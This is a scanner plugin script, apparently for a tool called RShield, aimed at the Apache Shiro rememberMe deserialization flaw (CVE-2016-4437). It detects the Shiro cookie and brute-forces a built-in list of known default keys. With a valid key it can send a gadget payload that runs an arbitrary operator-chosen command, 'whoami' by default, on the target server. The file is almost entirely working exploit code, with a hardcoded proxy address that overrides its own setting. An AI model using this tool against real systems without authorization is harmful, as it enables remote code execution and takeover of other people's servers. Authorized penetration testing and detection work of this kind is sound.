
// 返回插件元数据的函数
fn get_manifest() {
    let manifest = #{
        name: "ShiroDetector",
        description: "Apache Shiro权限绕过和反序列化漏洞检测 (支持密钥爆破和命令执行)",
        author: "RShield Team",
        version: "1.1.0",
        rtype: "deserialization",
        severity:"high",
        references: [
            "https://issues.apache.org/jira/browse/SHIRO-550",
            "https://cwiki.apache.org/confluence/display/SHIRO/Security+Bulletins",
            "https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"
        ],
        params: [
            #{
                name: "超时时间(秒)",
                key: "timeout",
                type: "number",
                required: false,
                default_value: 30,
                description: "HTTP请求超时时间"
            },
            #{
                name: "Cookie名称",
                key: "cookie_name",
                type: "string",
                required: false,
                default_value: "rememberMe",
                description: "Shiro使用的Cookie名称"
            },
            #{
                name: "最大重定向次数",
                key: "max_redirects",
                type: "number",
                required: false,
                default_value: 5,
                description: "允许的最大HTTP重定向次数"
            },
            #{
                name: "代理URL",
                key: "proxy_url",
                type: "string",
                required: false,
                default_value: "http://127.0.0.1:8080",
                description: "HTTP代理URL，例如http://127.0.0.1:8080"
            },
            #{
                name: "密钥列表 (用于爆破)",
                key: "keys_to_bruteforce",
                type: "array",
                item_type: "string",
                required: false,
                default_value: [],
                description: "要尝试爆破的密钥列表 (Base64编码)。如果为空，则使用内置常见密钥列表。"
            },
            #{
                name: "启用命令执行",
                key: "enable_command_execution",
                type: "boolean",
                required: false,
                default_value: false,
                description: "如果爆破成功，是否尝试使用有效密钥执行命令。"
            },
            #{
                name: "要执行的命令",
                key: "command_to_execute",
                type: "string",
                required: false,
                default_value: "whoami",
                description: "如果启用命令执行，要尝试执行的命令。"
            },
            #{
                name: "RCE Gadget",
                key: "gadget_for_rce",
                type: "string",
                required: false,
                default_value: "",
                description: "要使用的RCE Gadget名称"
            }
        ],
        result_fields: [
            #{
                name: "漏洞类型",
                key: "type",
                type: "string",
                description: "漏洞类型，如：反序列化、权限绕过等"
            },
            #{
                name: "风险级别",
                key: "risk_level",
                type: "string",
                description: "风险级别：高、中、低"
            },
            #{
                name: "漏洞信息",
                key: "info",
                type: "string",
                description: "检测到的漏洞详细信息"
            },
            #{
                name: "测试结果",
                key: "test_results",
                type: "object",
                description: "测试步骤和结果，包含密钥爆破和命令执行尝试的详情"
            },
            #{
                name: "CVE编号",
                key: "cve",
                type: "array",
                description: "相关CVE编号列表"
            }
        ]
    };
    
    return to_json(manifest);
}

fn send_http_request(params) {
    let request_json = to_json(params);
    let response = http_request(request_json);
    let parsed_response = parse_json(response);
    if parsed_response.error != () {
        print_error(`HTTP请求错误: ${parsed_response.error}`);
    }
    parsed_response.raw_request = request_json;
    return parsed_response;
}

fn detect_shiro_cookie(url, cookie_name, timeout, proxy_url, max_redirects) {
    let params = #{
        url: url,
        method: "GET",
        headers: #{
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Cookie": `${cookie_name}=x`
        },
        timeout: timeout,
        proxy_url: proxy_url,
        follow_redirects: true,
        max_redirects: max_redirects
    };
    
    let response = send_http_request(params);
        if response.error != () {
        return #{ detected: false, request: params, response: response };
    }
    let headers_json = to_json(response.headers);
    if headers_json.to_lower().contains(`"set-cookie"`) && 
       headers_json.to_lower().contains(cookie_name.to_lower()) {
        return #{ detected: true, request: params, response: response };
    }
    return #{ detected: false, request: params, response: response };
}

fn test_key_vulnerability(url, cookie_name, key, timeout, proxy_url, max_redirects) {
    let test_payload = create_generic_deserialization_test_payload(key);
    let params = #{
        url: url,
        method: "GET",
        headers: #{
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Cookie": `${cookie_name}=${test_payload}`,
        },
        timeout: timeout,
        proxy_url: proxy_url,
        follow_redirects: false, // 对于密钥测试，通常不希望跟随重定向，直接看原始响应
        max_redirects: max_redirects
    };
    let response = send_http_request(params);
    let key_is_potentially_valid = false;

    if  response.status_code != () {
        if response.status_code >= 500 {
            key_is_potentially_valid = true;
        }

        let has_delete_me = true;
        if response.headers["Set-Cookie"] == (){
            has_delete_me = false;
        }
        if !has_delete_me {
             key_is_potentially_valid = true;
        } 
    } 
    return #{ valid: key_is_potentially_valid, request: params, response: response };
}

fn create_generic_deserialization_test_payload(key) {
    let payload = generate_shiro_rce_payload_external(key, "Test", "");
    return payload;
}

// 新增：创建命令执行Payload (调用外部Rust函数)
fn create_command_execution_payload(key, gadget_name, command) {
    
    try {
        let payload = generate_shiro_rce_payload_external(key, gadget_name, command);
        return payload;
    } catch (err) {
        return `PAYLOAD_GENERATION_FAILED_RUST: ${err}`;
    }

}

fn analyze(request_json) {
    let request = parse_json(request_json);
    let target = request.target;
    let params = if request.params != () { request.params } else { #{} };


    let timeout = if params.timeout != () { params.timeout } else { 30 };
    let cookie_name = if params.cookie_name != () { params.cookie_name } else { "rememberMe" };
    let proxy_url = "http://127.0.0.1:8081";
    let max_redirects = if params.max_redirects != () { params.max_redirects } else { 5 };
    
    let keys_to_bruteforce_param = if params.keys_to_bruteforce != () { params.keys_to_bruteforce } else { [] };
    let enable_command_execution = if params.enable_command_execution != () { params.enable_command_execution } else { false };
    let command_to_execute = if params.command_to_execute != () { params.command_to_execute } else { "whoami" };

    let  vulnerable = false; // 是否最终发现漏洞
    let  details = "";
    let  test_results = #{ // 存储详细测试步骤和发现
        cookie_detection: #{ detected: false, notes: "未开始" },
        key_bruteforce: #{
            keys_tested: [],
            successful_keys: [],
            notes: "未开始"
        },
        command_execution: #{
            attempted: false,
            attempts_details: [], // 存储每次命令执行的尝试详情
            notes: "未开始或未启用"
        }
    };
    
    let  http_log = []; // 存储所有相关的HTTP请求和响应对

    // 验证URL
    if !(target.starts_with("http://") || target.starts_with("https://")) {
        return to_json(#{
            success: false,
            details: "目标URL格式错误，请使用http://或https://开头的完整URL",
            data: #{ type: "error", risk_level: "无", info: "URL格式错误" },
            raw_output: "无效的URL格式"
        });
    }

    // 步骤1: 检测Shiro Cookie
    let cookie_check_result = detect_shiro_cookie(target, cookie_name, timeout, proxy_url, max_redirects);
    test_results.cookie_detection.detected = cookie_check_result.detected;
    test_results.cookie_detection.cookie_name_used = cookie_name;
    http_log.push(#{ 
        step: "Cookie Detection", 
        request: cookie_check_result.request, 
        response: cookie_check_result.response 
    });

    if cookie_check_result.detected {
        test_results.cookie_detection.notes = `检测到与Shiro相关的Cookie "${cookie_name}"。`;
    } else {
        test_results.cookie_detection.notes = `未检测到Shiro Cookie "${cookie_name}"。目标可能未使用Shiro或使用了不同的Cookie名称。`;
        details = test_results.cookie_detection.notes;
        return to_json(#{
            success: false, // 未发现Shiro Cookie，无法继续
            details: details,
            data: #{
                type: "info",
                risk_level: "无",
                info: details,
                test_results: test_results
            },
            raw_output: details,
            http_log: http_log
        });
    }

    let  keys_to_test = [];
    if keys_to_bruteforce_param.is_empty() {
        keys_to_test = [
            
             "4AvVhmFLUs0KTA3Kprsdag==", "Z3VucwAAAAAAAAAAAAAAAA==","kPH+bIxk5D2deZiIxcaaaA==",
            "fCq+/xW488hMTCD+cmJ3aQ==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==",
            "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==",
            "wzTGU9qTq7sEZL3B4cdPNg==", "RVZBTk5FAAAAAAAAAAAAAA==", "L7JnaTr3h0h92r00LVhWIA==",
            "U3ByaW5nQmxhZGUAAAAAAA==", "5AvVhmFLUs0KTA3Kprsdag==", "bXlhc2Rhb2FsYmFiYQAAAA==",
            "empodDEyMwAAAAAAAAAAAA==",  "Q01TX0JMX0NPTUZJRwAAAA=="
        ];
    } else {
        keys_to_test.extend(keys_to_bruteforce_param);
    }
    test_results.key_bruteforce.keys_to_be_tested_count = keys_to_test.len();
    let cloned_keys_for_report = [];
    for item in keys_to_test {
        cloned_keys_for_report.push(item);
    }
    test_results.key_bruteforce.keys_tested = cloned_keys_for_report; 

    let found_valid_keys = []; 
    for key_to_test in keys_to_test {
        let key_test_result = test_key_vulnerability(target, cookie_name, key_to_test, timeout, proxy_url, max_redirects);
        http_log.push(#{ 
            step: `Key Bruteforce: ${key_to_test}`, 
            request: key_test_result.request, 
            response: key_test_result.response 
        });
        if key_test_result.valid {
            found_valid_keys.push(key_to_test);
            vulnerable = true; // 标记漏洞存在
        } 
    }
    test_results.key_bruteforce.successful_keys = found_valid_keys;

    if found_valid_keys.is_empty() {
        test_results.key_bruteforce.notes = "密钥爆破完成，未找到有效密钥。";
    } else {
        test_results.key_bruteforce.notes = `密钥爆破成功! 发现有效密钥: ${found_valid_keys}.`;
    }
    
    // 模块2: 命令执行 (仅当启用了命令执行且找到了有效密钥时)
    test_results.command_execution.attempted = enable_command_execution;
    if enable_command_execution && !found_valid_keys.is_empty() {
        test_results.command_execution.notes = `尝试使用有效密钥执行命令 "${command_to_execute}"。`;
        test_results.command_execution.command_to_execute = command_to_execute;
        let selected_gadget = params.gadget_for_rce;
        if selected_gadget == () || selected_gadget == "" {
             selected_gadget = "TomcatEcho3"; // 默认 gadget
        }
        test_results.command_execution.gadget_used = selected_gadget;


        for valid_key in found_valid_keys {
            let cmd_payload = create_command_execution_payload(valid_key, selected_gadget, command_to_execute);

            let attempt_detail = #{
                key_used: valid_key,
                gadget_used: selected_gadget,
                command: command_to_execute,
                payload_sent: "N/A", // Will be updated if generation succeeds
                status: "Skipped",
                notes: ""
            };

            if cmd_payload.starts_with("PAYLOAD_GENERATION_FAILED_RUST:") || cmd_payload == "PAYLOAD_GENERATION_RUST_FN_UNAVAILABLE" {
                let error_note = `无法为密钥 "${valid_key}" 和命令 "${command_to_execute}" (gadget: ${selected_gadget}) 生成有效的payload. Details: ${cmd_payload}`;
                attempt_detail.status = "PayloadGenerationFailed";
                attempt_detail.notes = error_note;
                test_results.command_execution.attempts_details.push(attempt_detail);
                continue; 
            }

            let cmd_params = #{
                url: target,
                method: "GET", // 或根据需要选择POST
                headers: #{
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Cookie": `${cookie_name}=${cmd_payload}`,
                    "Testcmd": `${command_to_execute}`,
                    "Testecho": "123"
                },
                timeout: timeout,
                proxy_url: proxy_url,
                follow_redirects: false, // 命令执行通常不希望重定向
                max_redirects: max_redirects
            };
            let cmd_response_obj = send_http_request(cmd_params);
            http_log.push(#{ 
                step: `Command Execution: key=${valid_key}, cmd=${command_to_execute}, gadget=${selected_gadget}`, 
                request: cmd_params, 
                response: cmd_response_obj 
            });
            
            attempt_detail.status_code = cmd_response_obj.status;
            attempt_detail.response_body_preview = if cmd_response_obj.body != () { cmd_response_obj.body.sub_string(0, 200) } else { "" };
            attempt_detail.status = "CommandSent";
            
            // 简单的回显检测：检查响应状态码或特定错误
            if cmd_response_obj.error == () && cmd_response_obj.status != () {
                 if cmd_response_obj.status >= 500 {
                    let note = `命令执行(密钥: ${valid_key}, gadget: ${selected_gadget})可能已触发，服务器返回错误 ${cmd_response_obj.status}。回显需外部验证。`;
                    attempt_detail.notes = note;
                 } else {
                    let note = `命令执行(密钥: ${valid_key}, gadget: ${selected_gadget})响应状态: ${cmd_response_obj.status}. 回显需外部验证。`;
                    attempt_detail.notes = note;
                 }
            } else if cmd_response_obj.error != () {
                 let note = `命令执行(密钥: ${valid_key}, gadget: ${selected_gadget})时HTTP请求错误: ${cmd_response_obj.error}`;
                 attempt_detail.notes = note;
            }
            test_results.command_execution.attempts_details.push(attempt_detail);
        }
    } else if enable_command_execution && found_valid_keys.is_empty() {
        test_results.command_execution.notes = "启用了命令执行，但密钥爆破未找到有效密钥，跳过命令执行。";
    } else {
        test_results.command_execution.notes = "命令执行未启用。";
    }

    let final_risk_level = "无";
    let final_info = "未检测到Shiro Cookie或未发现已知密钥漏洞。";
    details = "扫描完成。";
    let final_cve = [];

    if test_results.cookie_detection.detected {
        if !found_valid_keys.is_empty() {
            final_risk_level = "高";
            final_info = `目标使用了Shiro，并通过爆破发现以下有效密钥: ${found_valid_keys}. 这可能导致反序列化远程代码执行。`;
            details = `Shiro密钥爆破成功: ${found_valid_keys}.`;
            final_cve.push("CVE-2016-4437"); // 主要的Shiro反序列化漏洞

            if enable_command_execution && !test_results.command_execution.attempts_details.is_empty() {
                details += " 已尝试使用有效密钥执行命令。";
            }
        } else {
            final_risk_level = "信息";
            final_info = "目标使用了Shiro，但未能通过提供的密钥列表或常见密钥检测到漏洞。建议检查是否使用了非标准密钥。";
            details = "检测到Shiro Cookie，但密钥爆破未成功。";
        }
    } else {
         // 这种情况之前已经return了，但为了逻辑完整性
         final_info = test_results.cookie_detection.notes;
    }
    
    let vulnerability_data = #{
        type: "shiro_deserialization",
        risk_level: final_risk_level,
        info: final_info,
        cve: final_cve,
        test_results: test_results,
        references: [ // 根据实际检测到的情况调整references
            "https://issues.apache.org/jira/browse/SHIRO-550",
            "https://www.anquanke.com/post/id/193165", // Shiro < 1.2.4 RCE
            "https://xz.aliyun.com/t/8480" // Shiro 历史漏洞分析
        ],
    };
    
    let last_significant_request = "";
    let last_significant_response = "";
    if !http_log.is_empty() {
        let last_entry = http_log[http_log.len() - 1];
        last_significant_request = to_json(last_entry.request); // 简化，实际应格式化为HTTP报文
        last_significant_response = to_json(last_entry.response); // 简化
    }

    return to_json(#{
        success: vulnerable, 
        details: details,
        data: vulnerability_data,
        raw_output: to_json(test_results), // 原始测试结果的JSON字符串
        request: last_significant_request, 
        response: last_significant_response,
        status_code: if !http_log.is_empty() { http_log[http_log.len()-1].response.status } else {0},
        http_log: http_log // 包含所有步骤的请求响应日志
    });
} 